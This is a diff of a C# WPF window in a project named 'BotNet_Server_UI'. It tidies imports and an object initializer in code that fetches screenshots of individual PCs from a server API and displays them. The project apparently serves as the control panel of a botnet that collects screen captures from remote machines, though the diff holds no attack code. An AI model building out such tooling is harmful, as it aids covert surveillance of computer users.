@@ -2,17 +2,8 @@
 // (or by any other means, with saving authorship by Zerumi and PizhikCoder retained)
 using System;
 using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Controls;
-using System.Windows.Data;
-using System.Windows.Documents;
-using System.Windows.Input;
-using System.Windows.Media;
-using System.Windows.Media.Imaging;
-using System.Windows.Shapes;
 
 namespace BotNet_Server_UI
 {
@@ -28,7 +19,7 @@ namespace BotNet_Server_UI
             InitializeComponent();
         }
 
-        List<IP> ip = new List<IP>();
+        readonly List<IP> ip = new List<IP>();
         private async void ScrForm_Loaded(object sender, RoutedEventArgs e)
         {
             List<Button> buttons = new List<Button>();
@@ -65,8 +56,10 @@ namespace BotNet_Server_UI
             var name = element?.Name;
             var screen = await ApiRequest.GetProductAsync<Screen>("/api/v1/screens/" + name.Remove(0, 1));
             nameofpc = ip[Convert.ToInt32(name.Remove(0, 1))].nameofpc;
-            ScreenBox screenBox = new ScreenBox(screen.screens, nameofpc);
-            screenBox.Title = "Скриншоты " + ip[Convert.ToInt32(name.Remove(0, 1))].nameofpc;
+            ScreenBox screenBox = new ScreenBox(screen.screens, nameofpc)
+            {
+                Title = "Скриншоты " + ip[Convert.ToInt32(name.Remove(0, 1))].nameofpc
+            };
             screenBox.Show();
         }
     }
